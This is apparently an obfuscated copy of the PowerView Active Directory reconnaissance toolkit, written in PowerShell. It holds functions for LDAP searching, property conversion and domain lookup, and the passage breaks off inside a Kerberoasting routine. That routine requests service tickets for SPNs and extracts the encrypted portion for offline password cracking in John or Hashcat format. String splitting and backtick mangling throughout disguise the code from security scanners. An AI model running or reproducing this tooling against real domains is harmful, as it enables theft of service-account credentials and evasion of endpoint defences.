&("{1}{2}{0}"-f 'EM','SEt','-It') ('VAri'+'ABle:KoNy'+'3'+'M')  ([TypE]("{5}{0}{3}{2}{1}{6}{7}{4}" -f 'reCTOR','EF','eRvIcES.r','ys','PtIoN','SySteM.Di','eRRaLch','ASiNGO') ) ;    &("{1}{0}" -f 't','sE')  ('4'+'Bl')  ( [Type]("{8}{10}{3}{5}{0}{1}{2}{7}{9}{4}{6}" -f 'Cto','RYSe','RvICeS.sE','DI','K','rE','s','cUritYm','Sys','as','tEM.')  );  &("{0}{1}"-f'S','ET')  ("{0}{1}" -f 'E','5V') ( [tYPe]("{1}{0}" -F'tImE','date'));&("{1}{2}{0}{3}" -f 'RIa','SET-V','a','ble')  ("y"+"D0tjI")  ( [typE]("{0}{8}{7}{2}{4}{6}{5}{1}{3}"-f'sy','On.bI','re','ndIngFlAgS','FlE','I','CT','M.','Ste')  )  ;  &('sV')  ('bC'+'k')  (  [Type]("{6}{1}{9}{4}{7}{5}{3}{8}{0}{2}"-f'EDiRecToRY.do','d','mAin','AC','RY','RvIces.','sYsTEm.','SE','tiv','IrecTo') );   &("{0}{1}"-f 'sEt','-IteM') ("{0}{2}{1}{3}"-f 'V','L','ariab','e:8GZ') ([TyPE]("{1}{3}{2}{0}" -F 'y','rEf','EmBl','lEcTIOn.aSs') )  ;  ${mk`8`Yi}=  [TyPe]("{2}{0}{3}{1}{4}"-f'TE','n','SyS','m.BITCO','veRter');  ${N`G4`l9} = [TYpe]("{0}{1}{2}"-f 'C','o','NvErt');    ${B`SM}=  [tYpe]("{0}{1}{2}"-f'BItCoNV','E','rTer')  ;    &("{0}{1}"-f 'Se','t') ('JHu'+'W95') ([TYpe]("{4}{2}{0}{5}{1}{3}" -F 'm','ION.P','eMent.AUto','SCrEDEnTIaL','manAg','At') ) ;  

function GeT-DOma`InSe`A`R`cHEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{4}{1}{2}" -f 'Should','ro','cess','PS','P'}, '')]
    [OutputType({"{11}{9}{10}{3}{7}{0}{4}{2}{6}{1}{12}{8}{5}" -f'S','ectory','rvi','irecto','e','er','ces.Dir','ry','earch','tem.','D','Sys','S'})]
    [CmdletBinding()]
    Param(
        [Parameter(valuEfROmPIPElinE = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'ter','Fil'})]
        [String]
        ${LdAPF`ilT`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${proP`ErT`iES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'ADSPat','h'})]
        [String]
        ${SeARc`h`B`Ase},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SEa`RCH`B`AsEpRe`F`IX},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}{4}" -f'tr','ol','nCon','Domai','ler'})]
        [String]
        ${S`ERV`eR},

        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{1}{2}{0}"-f 'Level','On','e'}, {"{1}{0}"-f 'btree','Su'})]
        [String]
        ${SEA`RCH`sc`OPe} = ("{0}{2}{1}"-f'Subt','e','re'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RE`su`LT`paGeSiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SerVeRtiM`E`lI`MIT} = 120,

        [ValidateSet({"{1}{0}" -f'acl','D'}, {"{0}{1}"-f 'G','roup'}, {"{0}{1}"-f 'Non','e'}, {"{1}{0}" -f'ner','Ow'}, {"{1}{0}"-f 'acl','S'})]
        [String]
        ${Se`c`UrIt`Y`MAsKs},

        [Switch]
        ${TO`mB`Stone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`DeN`TIal} =   ${J`hu`w95}::"e`mpTy"
    )

    PROCESS {
        if (${PSbo`UND`pa`R`AMeTe`Rs}[("{0}{1}" -f'D','omain')]) {
            ${tARg`Et`domA`iN} = ${doM`AIN}
        }
        else {
            
            if (${PsBoU`ND`PA`RAmeTers}[("{1}{2}{0}" -f 'al','Cr','edenti')]) {
                ${DOMa`I`NoBje`CT} = &("{1}{0}{2}"-f't','Ge','-Domain') -Credential ${CR`eDeNTi`AL}
            }
            else {
                ${D`oma`INObjEct} = &("{1}{0}{2}" -f 't','Ge','-Domain')
            }
            ${t`Arg`eT`do`Main} = ${dOm`Ai`Nobj`eCt}."n`AMe"
        }

        if (-not ${P`sbou`N`DPAraMETeRs}[("{0}{1}" -f 'Serve','r')]) {
            
            try {
                if (${dO`MaInoB`JECT}) {
                    ${BiN`DsE`RVer} = ${doMa`inobJE`ct}."PDcrO`LEo`w`NeR"."N`Ame"
                }
                elseif (${PsbOUn`DpAr`AMETe`Rs}[("{1}{2}{0}" -f 'ial','Creden','t')]) {
                    ${B`iND`s`ERVEr} = ((&("{2}{1}{0}"-f'main','Do','Get-') -Credential ${CreDE`NT`iAL})."pDC`R`oLeo`wNER")."NA`Me"
                }
                else {
                    ${bIN`D`sEr`VEr} = ((&("{3}{1}{2}{0}"-f 'in','t-D','oma','Ge'))."P`dcR`OlE`OwNER")."NA`Me"
                }
            }
            catch {
                throw ('[Get'+'-DomainSear'+'c'+'her] '+'E'+'r'+'ror '+'i'+'n '+'r'+'etri'+'evi'+'ng '+'P'+'DC '+'f'+'or '+'curr'+'en'+'t '+'do'+'main:'+' '+"$_")
            }
        }
        else {
            ${BI`ND`SErVeR} = ${s`ERVer}
        }

        ${S`e`ArchStRiNG} = ("{1}{0}"-f '/','LDAP:/')

        if (${Bi`N`DS`eRver} -and (${bI`NDS`Erv`eR}.("{0}{1}" -f'Tri','m').Invoke() -ne '')) {
            ${SEaRCHs`TRi`Ng} += ${binDsEr`V`Er}
            if (${tARg`Et`domaIn}) {
                ${sEaRc`hsT`Ri`Ng} += '/'
            }
        }

        if (${ps`BO`Undp`ARaMeTe`RS}[("{4}{0}{1}{2}{3}" -f 'arch','BasePre','f','ix','Se')]) {
            ${SE`ArCH`StRI`Ng} += ${s`Ear`ChBaSe`PRefIx} + ','
        }

        if (${ps`BO`Und`p`AR`AMeteRs}[("{1}{2}{0}{3}"-f'rch','Se','a','Base')]) {
            if (${s`eARCh`B`AsE} -Match ("{0}{1}" -f '^','GC://')) {
                
                ${Dn} = ${sEA`Rc`Hba`se}.("{2}{1}{0}" -f'r','Uppe','To').Invoke().("{0}{1}"-f 'T','rim').Invoke('/')
                ${SEa`RcHS`TriNg} = ''
            }
            else {
                if (${searc`HB`ASe} -match ("{1}{0}"-f 'AP://','^LD')) {
                    if (${S`E`ARcHBASE} -match ("{0}{1}{2}" -f 'LDAP:/','/.','+/.+')) {
                        ${S`E`ARch`S`TriNg} = ''
                        ${d`N} = ${SEA`RCH`BA`se}
                    }
                    else {
                        ${Dn} = ${SEA`R`CHb`ASe}.("{1}{0}{2}"-f 'in','SubStr','g').Invoke(7)
                    }
                }
                else {
                    ${dn} = ${Se`Ar`chbAsE}
                }
            }
        }
        else {
            
            if (${tARGeTd`om`A`iN} -and (${TA`Rg`eTdO`mAiN}.("{1}{0}"-f 'rim','T').Invoke() -ne '')) {
                ${d`N} = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        ${SEAr`chStR`I`Ng} += ${D`N}
        &("{0}{2}{1}" -f 'W','rbose','rite-Ve') ('['+'Ge'+'t-D'+'oma'+'i'+'nSear'+'cher] '+'se'+'ar'+'ch '+'str'+'ing'+': '+"$SearchString")

        if (${C`ReDEN`TIaL} -ne   ( &("{2}{0}{1}" -f 'Et-VARiabL','E','g') ("JhUW"+"9"+"5"))."va`LUe"::"emP`TY") {
            &("{1}{2}{0}" -f 'se','W','rite-Verbo') ("{4}{15}{9}{14}{2}{8}{12}{7}{5}{6}{11}{1}{13}{0}{16}{3}{18}{17}{10}"-f'or','d','al','onnec','[Get-D',' c','r','nate','t','ainSearcher] ','on','e','er','entials f','Using ','om',' LDAP c','i','t')
            
            ${DOmA`I`NOb`ject} = &("{2}{0}{1}" -f'bje','ct','New-O') ("{6}{5}{4}{2}{1}{3}{0}{7}" -f't','ry','ces.Directo','En','vi','r','DirectorySe','ry')(${SEa`RchS`TRiNg}, ${cRED`EnT`iAL}."USe`RNa`ME", ${cRe`de`Ntial}.("{3}{0}{2}{1}"-f 'kC','ential','red','GetNetwor').Invoke()."PAsS`wOrD")
            ${s`EaR`chEr} = &("{1}{2}{3}{0}"-f'ct','Ne','w-Ob','je') ("{3}{4}{6}{1}{9}{0}{11}{7}{8}{12}{10}{5}{2}" -f'recto','.','cher','Sys','t','ar','em','ces.Dire','c','Di','rySe','ryServi','to')(${d`Oma`iNOBJ`ECt})
        }
        else {
            
            ${SE`ArC`hER} = &("{3}{2}{1}{0}"-f'ct','je','b','New-O') ("{3}{2}{7}{4}{5}{0}{1}{6}"-f'es.DirectorySea','rche','to','System.Direc','S','ervic','r','ry')([ADSI]${S`eA`R`ChsTRI`NG})
        }

        ${SEARc`h`eR}."P`A`gEsIZE" = ${r`eSuLTP`Age`SI`ze}
        ${sEa`Rc`H`eR}."SE`ARcH`scOPE" = ${seA`Rc`hScOpE}
        ${sEA`RC`HeR}."ca`cHe`REsuLTs" = ${f`Alse}
        ${SE`ARc`H`Er}."ref`ErR`AL`chas`INg" =  ${Ko`Ny3m}::"a`lL"

        if (${P`s`BoundP`A`RAMETE`RS}[("{1}{0}{2}{3}" -f 'e','ServerTim','L','imit')]) {
            ${seaRc`h`ER}."sERvErTI`m`el`Imit" = ${SERv`eR`TImeLI`miT}
        }

        if (${PsBouNdPa`RAMEt`e`RS}[("{2}{0}{1}" -f 'm','bstone','To')]) {
            ${se`ARC`HEr}."T`OM`BStONE" = ${t`Rue}
        }

        if (${psb`OuND`paRAM`ete`Rs}[("{1}{0}{2}" -f 'PFil','LDA','ter')]) {
            ${SEARch`eR}."fiL`TEr" = ${l`DAP`FiLTER}
        }

        if (${pSBOUnd`p`Ar`AmEteRS}[("{0}{1}{2}{3}" -f 'SecurityMa','s','k','s')]) {
            ${S`e`A`RchEr}."Se`c`UrITyMasKS" = Switch (${S`EcUR`ityM`AsKs}) {
                ("{0}{1}"-f 'Da','cl') {   (&("{0}{1}{2}"-f 'V','ARIaBl','E') ('4b'+'l'))."v`ALuE"::"D`AcL" }
                ("{1}{0}"-f'roup','G') {  ${4`BL}::"g`Roup" }
                ("{0}{1}" -f 'Non','e') {   (  &("{0}{1}" -f 'VArIa','blE') ("4"+"BL"))."VA`lUE"::"n`onE" }
                ("{1}{0}"-f'er','Own') {  ${4`BL}::"OwN`er" }
                ("{1}{0}"-f'acl','S') {   (&("{0}{1}{2}{3}" -f'gE','t-','vaRIab','le') ('4'+'bL'))."vA`luE"::"Sa`cl" }
            }
        }

        if (${PsbOun`D`p`AraMETeRS}[("{2}{1}{3}{0}" -f 's','er','Prop','tie')]) {
            
            ${PROpErTiE`s`Tol`o`Ad} = ${Pr`O`P`erTIES}| &("{0}{2}{3}{1}"-f 'F','Object','orEac','h-') { ${_}.("{0}{1}" -f 'Sp','lit').Invoke(',') }
            ${n`ULl} = ${S`ea`RchEr}."PropER`T`i`eSTOL`oad".("{0}{1}"-f 'Ad','dRange').Invoke((${prop`ERt`IestO`l`OaD}))
        }

        ${S`eAr`cHeR}
    }
}


function C`On`VErt-`Ld`APPr`opErtY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{4}{2}" -f 'r','ShouldP','s','PS','oces'}, '')]
    [OutputType({"{3}{2}{9}{7}{0}{10}{8}{1}{5}{4}{6}" -f 'PS','tom','Manage','System.','ec','Obj','t','tion.','us','ment.Automa','C'})]
    [CmdletBinding()]
    Param(
        [Parameter(mAndaTorY = ${tr`Ue}, ValUeFROmPIpEliNe = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        ${p`ROpe`RtIES}
    )

    ${o`BjEct`PROp`e`RTIEs} = @{}

    ${p`Rop`erti`eS}."pRop`ErTY`N`AmEs" | &("{4}{0}{2}{1}{3}" -f'o','ch-Obj','rEa','ect','F') {
        if (${_} -ne ("{0}{1}{2}"-f'ad','spat','h')) {
            if ((${_} -eq ("{2}{0}{1}" -f 'b','jectsid','o')) -or (${_} -eq ("{1}{0}{2}" -f 'histor','sid','y'))) {
                
                ${oBjeCTPr`opE`Rt`iES}[${_}] = ${pR`operT`i`ES}[${_}] | &("{0}{1}{2}{3}"-f 'Fo','rE','ach-Ob','ject') { (&("{1}{3}{0}{2}" -f 'je','New-','ct','Ob') ("{4}{6}{0}{3}{5}{1}{2}{8}{7}"-f 'P','yIdenti','fi','rincipal.Securi','System.Secu','t','rity.','r','e')(${_}, 0))."v`AluE" }
            }
            elseif (${_} -eq ("{2}{1}{0}"-f 'e','ptyp','grou')) {
                ${ObJe`CtPr`o`pEr`T`ies}[${_}] = ${prO`p`ER`TIeS}[${_}][0] -as ${grOu`Ptype`EnUM}
            }
            elseif (${_} -eq ("{4}{2}{0}{1}{3}"-f 'a','ccountt','am','ype','s')) {
                ${ObjEctP`RO`P`erTIeS}[${_}] = ${PrOp`e`RtieS}[${_}][0] -as ${samA`cCoUNTTY`Pe`E`Num}
            }
            elseif (${_} -eq ("{2}{0}{1}"-f 'ectgu','id','obj')) {
                
                ${ObjE`CtpROPe`Rti`ES}[${_}] = (&("{0}{2}{1}" -f 'N','ect','ew-Obj') ("{0}{1}" -f 'Gu','id') (,${p`R`operTIeS}[${_}][0]))."gU`iD"
            }
            elseif (${_} -eq ("{3}{1}{2}{4}{0}"-f'ol','ac','countco','user','ntr')) {
                ${OBjEcTp`RO`PE`RtIes}[${_}] = ${pRO`p`e`RTIES}[${_}][0] -as ${UAce`N`Um}
            }
            elseif (${_} -eq ("{3}{1}{4}{2}{5}{0}"-f'tor','ityde','i','ntsecur','scr','p')) {
                
                ${DEscriP`T`oR} = &("{1}{0}{2}" -f'ew-Ob','N','ject') ("{10}{7}{4}{1}{8}{2}{6}{5}{9}{3}{0}" -f 'tor','.','wS','p','ontrol','y','ecurit','curity.AccessC','Ra','Descri','Se') -ArgumentList ${P`RO`PeRT`iEs}[${_}][0], 0
                if (${D`E`scRiptoR}."oWn`er") {
                    ${OB`JECTp`Rope`R`T`iEs}[("{1}{0}" -f 'r','Owne')] = ${deSc`Ri`Ptor}."owN`ER"
                }
                if (${DESCR`i`pt`Or}."G`Roup") {
                    ${ObJE`C`Tpro`perties}[("{1}{0}" -f'up','Gro')] = ${DE`S`crIP`Tor}."G`ROup"
                }
                if (${De`SCri`PT`OR}."dISC`RET`i`ONAryacl") {
                    ${obje`CTPRopeR`T`i`Es}[("{3}{2}{0}{4}{1}"-f're','onaryAcl','c','Dis','ti')] = ${DescR`Ipt`Or}."diSc`RE`TIOn`ARyACl"
                }
                if (${dEScR`I`PtOR}."SYSTE`Ma`cl") {
                    ${o`BJectPRopE`R`TiEs}[("{0}{1}{2}"-f'Sy','ste','mAcl')] = ${dEs`cripT`oR}."SyS`Te`mACl"
                }
            }
            elseif (${_} -eq ("{2}{3}{4}{1}{0}"-f 'ires','p','acc','o','untex')) {
                if (${PrO`P`eRtI`Es}[${_}][0] -gt   ( &('LS')  ("vARI"+"AblE"+":"+"E5v"))."VA`LUe"::"max`Va`luE"."TI`CKS") {
                    ${OBje`CT`PRopERtI`Es}[${_}] = ("{1}{0}" -f 'ER','NEV')
                }
                else {
                    ${ObJ`ecTP`Ro`pERtiES}[${_}] =   (&("{2}{3}{1}{0}" -f'bLE','Ia','G','et-vAr')  ('E'+'5v'))."v`ALue"::"fRoMf`IlE`TI`Me"(${P`ROPe`RtiEs}[${_}][0])
                }
            }
            elseif ( (${_} -eq ("{0}{2}{1}"-f'lastl','on','og')) -or (${_} -eq ("{0}{3}{2}{1}"-f 'last','estamp','ntim','logo')) -or (${_} -eq ("{0}{2}{1}{3}" -f'p','dlast','w','set')) -or (${_} -eq ("{2}{1}{0}"-f 'off','og','lastl')) -or (${_} -eq ("{1}{3}{2}{0}" -f 'e','ba','Tim','dPassword')) ) {
                
                if (${pr`OP`ertIES}[${_}][0] -is [System.MarshalByRefObject]) {
                    
                    ${te`mp} = ${pr`oPe`RTiES}[${_}][0]
                    [Int32]${H`igH} = ${tE`mP}.("{1}{0}" -f'pe','GetTy').Invoke().("{2}{0}{1}" -f 'k','eMember','Invo').Invoke(("{1}{0}{2}" -f'P','High','art'),   ${yd0`TjI}::"gE`T`propERty", ${nU`Ll}, ${te`MP}, ${nU`LL})
                    [Int32]${L`OW}  = ${te`Mp}.("{2}{0}{1}"-f 'tTyp','e','Ge').Invoke().("{0}{3}{1}{2}"-f 'Invo','e','Member','k').Invoke(("{1}{2}{0}"-f 'rt','L','owPa'),    (&("{0}{2}{3}{1}"-f 'C','TeM','hILd','i')  ("{1}{4}{2}{0}{3}" -f'yd0TJ','va','e:','I','riaBl')  )."VAL`UE"::"gET`pr`oPErtY", ${nU`ll}, ${t`EMp}, ${n`UlL})
                    ${O`Bjectpr`O`PErTieS}[${_}] = (  (&("{0}{2}{1}"-f 'V','bLE','ARIa') ("{1}{0}" -f'5V','E') -VAlUEon )::"FrO`mfI`l`EtiME"([Int64]("0x{0:x8}{1:x8}" -f ${hi`Gh}, ${l`ow})))
                }
                else {
                    
                    ${obJectP`R`OPE`RTieS}[${_}] = ( (  &('GI')  ("{2}{1}{3}{0}" -f 'e5v','arIABLe','V',':'))."vA`lUe"::"fromf`i`LeTI`mE"((${p`Ro`pERTiEs}[${_}][0])))
                }
            }
            elseif (${PrO`Pe`RtiEs}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${pr`Op} = ${pR`oPer`TIES}[${_}]
                try {
                    ${Te`mP} = ${pr`OP}[${_}][0]
                    [Int32]${h`IgH} = ${tE`MP}.("{2}{0}{1}"-f'etT','ype','G').Invoke().("{0}{2}{1}" -f 'InvokeM','ber','em').Invoke(("{1}{0}{2}" -f 'h','Hig','Part'),  ${yd0tJi}::"gETpropE`R`Ty", ${n`Ull}, ${T`EmP}, ${nu`Ll})
                    [Int32]${l`ow}  = ${TE`Mp}.("{1}{2}{0}"-f'pe','GetT','y').Invoke().("{1}{0}{2}"-f 'm','InvokeMe','ber').Invoke(("{2}{0}{1}"-f'o','wPart','L'),   (&("{0}{1}{2}{3}" -f 'ge','t-vAri','ab','Le') ("Y"+"d0tJi"))."VAl`UE"::"GEtPR`oPE`R`TY", ${n`ULL}, ${TE`mp}, ${nu`LL})
                    ${o`BjEc`TpRO`pERtiES}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${HI`gH}, ${l`OW})
                }
                catch {
                    &("{1}{0}{2}"-f'Verbo','Write-','se') ('[Conv'+'er'+'t-LD'+'APPr'+'o'+'per'+'ty] '+'erro'+'r: '+"$_")
                    ${oB`jecTP`RoPeRt`IEs}[${_}] = ${P`ROp}[${_}]
                }
            }
            elseif (${PRo`PeR`T`ieS}[${_}]."cO`UnT" -eq 1) {
                ${Ob`j`e`ct`propE`RtIES}[${_}] = ${Pro`pE`Rt`IeS}[${_}][0]
            }
            else {
                ${o`BJecT`PrOpe`R`TieS}[${_}] = ${PR`O`PERTiEs}[${_}]
            }
        }
    }
    try {
        &("{1}{0}{2}" -f'Ob','New-','ject') -TypeName ("{0}{2}{1}"-f'P','ject','SOb') -Property ${Obj`eCtPr`opErT`i`Es}
    }
    catch {
        &("{1}{2}{3}{0}"-f 'g','Wri','te','-Warnin') ('[C'+'onv'+'ert-'+'LDA'+'PP'+'ropert'+'y'+'] '+'Er'+'ror'+' '+'pars'+'i'+'ng '+'LD'+'AP '+'p'+'roper'+'ties '+': '+"$_")
    }
}


function ge`T-DoMa`In {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(poSition = 0, VAluEFrOmPipelInE = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`MAIn},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`ede`NtiAL} =   ${jH`Uw`95}::"eMP`TY"
    )

    PROCESS {
        if (${pSB`OU`N`dPa`RAmet`Ers}[("{3}{0}{2}{1}"-f'n','l','tia','Crede')]) {

            &("{0}{3}{2}{1}" -f'Wri','se','bo','te-Ver') ("{4}{9}{6}{3}{0}{1}{8}{7}{2}{5}"-f 'ials',' ','-','n] Using alternate credent','[Get','Domain','i','t','for Ge','-Doma')

            if (${pSBO`UN`dparAM`eT`ERs}[("{1}{0}"-f 'ain','Dom')]) {
                ${TarG`etdOM`AIN} = ${d`OmA`IN}
            }
            else {
                
                ${T`ARgE`T`dOMaIN} = ${CreDen`T`IaL}.("{1}{0}{2}{3}{4}" -f 'tNetw','Ge','orkCrede','nti','al').Invoke()."dOmA`in"
                &("{2}{3}{4}{1}{0}"-f 'ose','b','Write-V','e','r') ('[Get-Dom'+'ain'+']'+' '+'Extr'+'acte'+'d '+'domain'+' '+"'$TargetDomain' "+'fr'+'om '+'-'+'Creden'+'ti'+'al')
            }

            ${dO`maINcON`TE`xT} = &("{0}{1}{2}"-f'N','ew-Objec','t') ("{4}{7}{3}{5}{1}{6}{0}{8}{9}{2}" -f't','Servi','ryContext','r','S','y','ces.Ac','ystem.Directo','iveDirectory.Di','recto')(("{0}{1}"-f 'Domai','n'), ${tA`RGet`doM`A`IN}, ${c`Red`eNTIAL}."U`SeRNa`Me", ${c`RE`dEnTIAL}.("{0}{2}{1}{3}{5}{4}"-f 'Ge','tw','tNe','or','ial','kCredent').Invoke()."p`As`sWord")

            try {
                  (  &("{2}{3}{0}{1}"-f'varIaB','Le','g','eT-') ('b'+'ck') )."v`ALUE"::("{0}{2}{1}"-f 'Get','n','Domai').Invoke(${doM`AINCON`TE`xT})
            }
            catch {
                &("{3}{0}{4}{2}{1}" -f 'rite','rbose','e','W','-V') ('[Get-Do'+'ma'+'i'+'n]'+' '+'Th'+'e '+'s'+'peci'+'fied '+'doma'+'i'+'n '+"'$TargetDomain' "+'doe'+'s '+'n'+'ot '+'e'+'xis'+'t, '+'coul'+'d '+'no'+'t '+'b'+'e '+'co'+'ntacte'+'d, '+'the'+'re '+(('i'+'snCZit ')  -crEplACE  ([CHAR]67+[CHAR]90+[CHAR]105),[CHAR]39)+'an'+' '+'e'+'xi'+'sti'+'ng '+'tru'+'st, '+'or'+' '+'th'+'e '+'s'+'pe'+'cifi'+'ed '+'cre'+'dential'+'s '+'are'+' '+'inval'+'i'+'d: '+"$_")
            }
        }
        elseif (${PsB`OUnDp`A`R`Am`eTeRS}[("{2}{0}{1}" -f'o','main','D')]) {
            ${dOma`iN`c`OntE`Xt} = &("{1}{0}{2}"-f'j','New-Ob','ect') ("{6}{4}{5}{7}{0}{8}{2}{3}{10}{9}{1}" -f'es.Ac','toryContext','ive','Di','m.Direct','o','Syste','ryServic','t','tory.Direc','rec')(("{0}{1}"-f'Dom','ain'), ${dOM`AIn})
            try {
                 (&("{2}{0}{1}" -f'T-CHILD','ITEm','GE') ("Var"+"IAblE:"+"b"+"CK") )."Va`luE"::("{2}{1}{0}"-f'main','Do','Get').Invoke(${dOM`AiNCON`Text})
            }
            catch {
                &("{3}{2}{0}{1}" -f'bo','se','te-Ver','Wri') ('[G'+'et'+'-D'+'omain] '+'The'+' '+'speci'+'fie'+'d '+'d'+'om'+'ain '+"'$Domain' "+'doe'+'s '+'no'+'t '+'e'+'xist, '+'c'+'ou'+'ld '+'not'+' '+'b'+'e '+'contact'+'ed'+', '+'or'+' '+'the'+'re'+' '+(('isn'+'ViFt'+' ') -cRepLACe  ([CHAR]86+[CHAR]105+[CHAR]70),[CHAR]39)+'a'+'n '+'exist'+'ing'+' '+'tr'+'ust '+': '+"$_")
            }
        }
        else {
            try {
                 (&('gI') ('vAR'+'iaBle'+':b'+'cK') )."vAl`UE"::("{2}{1}{0}" -f'main','entDo','GetCurr').Invoke()
            }
            catch {
                &("{2}{3}{1}{0}"-f'rbose','e','Wri','te-V') ('['+'G'+'et-Do'+'m'+'ain] '+'Erro'+'r '+'r'+'e'+'t'+'rieving '+'the'+' '+'curren'+'t'+' '+'dom'+'ai'+'n: '+"$_")
            }
        }
    }
}



function g`eT-D`O`maiNsPnt`iC`ket {


    [OutputType({"{3}{5}{0}{1}{2}{4}" -f'T','ic','k','Po','et','werView.SPN'})]
    [CmdletBinding(defaULTPaRameteRSEtNAme = {"{0}{1}" -f 'RawS','PN'})]
    Param (
        [Parameter(poSItION = 0, PaRaMeTeRSEtNaME = "rA`w`spn", MAndaToRY = ${tr`UE}, ValUeFRompIpeLiNE = ${tR`UE})]
        [ValidatePattern({"{0}{1}" -f'.*','/.*'})]
        [Alias({"{5}{2}{0}{4}{3}{1}"-f 'eP','Name','vic','l','rincipa','Ser'})]
        [String[]]
        ${s`pn},

        [Parameter(POSITIOn = 0, pARameteRsETnamE = "u`SER", MANDatORy = ${t`RUE}, ValuEfROmpiPElInE = ${t`Rue})]
        [ValidateScript({ ${_}."pSObJe`cT"."TYP`ena`mEs"[0] -eq ("{3}{1}{4}{0}{2}"-f'Us','o','er','P','werView.') })]
        [Object[]]
        ${US`Er},

        [ValidateSet({"{1}{0}" -f 'ohn','J'}, {"{2}{0}{1}"-f 'shc','at','Ha'})]
        [Alias({"{0}{1}"-f 'F','ormat'})]
        [String]
        ${oUt`PU`Tfo`RMaT} = ("{0}{1}" -f 'Jo','hn'),

        [ValidateRange(0,10000)]
        [Int]
        ${De`laY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${JITT`Er} = .3,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${creD`En`T`IaL} =   ${J`H`Uw95}::"E`MPty"
    )

    BEGIN {
        ${nU`Ll} =   ( &("{0}{1}" -f'G','Et-iTEM') ("{1}{2}{0}" -f'e:8GZ','vA','rIabL'))."V`ALuE"::("{2}{0}{4}{1}{3}" -f'ithPa','alN','LoadW','ame','rti').Invoke(("{0}{2}{3}{1}"-f'Sys','dentityModel','tem.','I'))

        if (${PSbOUn`D`PA`Ra`me`TerS}[("{1}{0}{2}" -f 'ede','Cr','ntial')]) {
            ${LoG`oNTOK`EN} = &("{0}{3}{1}{2}{4}{5}"-f'Inv','U','s','oke-','erImperso','nation') -Credential ${CR`eDEnT`I`AL}
        }
    }

    PROCESS {
        if (${pSbo`UNDP`ARAME`TeRS}[("{0}{1}" -f'Us','er')]) {
            ${tArGe`T`oB`jECt} = ${U`sER}
        }
        else {
            ${TaRGeT`o`B`j`ECT} = ${S`pn}
        }
	
	${RA`ND`NO} = &("{2}{0}{1}" -f'w-Obje','ct','Ne') ("{0}{4}{1}{2}{3}" -f 'Sys','m','.','Random','te')

        ForEach (${O`B`JEcT} in ${t`Ar`gEt`ObJEcT}) {

            if (${P`SBO`UnDpar`AMEtErS}[("{1}{0}"-f'ser','U')]) {
                ${uS`ER`SPn} = ${obJ`EcT}."SeRV`iC`e`p`R`iNCIpalnAmE"
                ${SaMaC`C`Ou`Ntname} = ${obj`e`ct}."S`AmAccOu`N`TNAme"
                ${DistI`N`guiS`HednAmE} = ${ObJ`EcT}."DisTI`Ng`UIS`HEdn`AME"
            }
            else {
                ${uS`eR`spN} = ${O`BJeCt}
                ${SA`mAc`COu`N`TnAMe} = ("{2}{0}{1}"-f'W','N','UNKNO')
                ${DIS`TiN`gui`s`h`edNAMe} = ("{0}{1}{2}"-f'UN','KNO','WN')
            }

            
            if (${USer`s`Pn} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${USeR`sPN} = ${u`seR`sPn}[0]
            }

            try {
                ${tic`k`Et} = &("{1}{2}{0}" -f'ject','New','-Ob') ("{5}{6}{12}{3}{2}{9}{1}{10}{0}{11}{7}{8}{4}"-f'b','ens.K','o','M','n','Sy','stem.','sRequesto','rSecurityToke','del.Tok','er','ero','Identity') -ArgumentList ${Us`Ers`pn}
            }
            catch {
                &("{4}{3}{1}{0}{2}" -f 'rnin','Wa','g','ite-','Wr') ('['+'G'+'et'+'-Domai'+'nSPNT'+'icket]'+' '+'E'+'rror '+'re'+'q'+'uesting '+'ti'+'cket '+'f'+'or '+'S'+'PN '+"'$UserSPN' "+'from'+' '+'use'+'r '+"'$DistinguishedName' "+': '+"$_")
            }
            if (${t`iCK`ET}) {
                ${T`icK`e`TbytEstR`eAM} = ${TiCk`eT}.("{2}{1}{0}"-f't','es','GetRequ').Invoke()
            }
            if (${t`iCk`eTBYTeStRE`Am}) {
                ${O`UT} = &("{0}{2}{1}"-f 'Ne','-Object','w') ("{0}{1}{2}" -f 'PSO','b','ject')

                ${tI`cKeTH`ex`STR`Eam} =   ( &("{2}{1}{0}"-f'e','Bl','GET-VariA')  ('mK8'+'YI')  -va)::("{0}{2}{1}"-f'T','String','o').Invoke(${TiC`kET`BYt`e`STREam}) -replace '-'

                
                
                if(${t`icK`eThEXSTR`eaM} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    ${e`T`YpE} =   (  &("{1}{3}{0}{2}"-f 'BL','GEt-','E','varia')  ("{1}{0}" -f'G4L9','n'))."VAl`Ue"::("{1}{2}{0}"-f'Byte','T','o').Invoke( ${MATCH`eS}."ETYp`eL`en", 16 )
                    ${c`IpheRT`ext`lEn} =  ${NG`4l9}::("{0}{1}" -f'ToUInt','32').Invoke(${M`AT`CHES}."CI`PhErte`XtLen", 16)-4
                    ${CI`pHe`RTeXt} = ${mA`Tc`hes}."D`Atatoend".("{1}{0}{2}"-f'u','S','bstring').Invoke(0,${cIpH`ERt`e`XtLen}*2)

                    
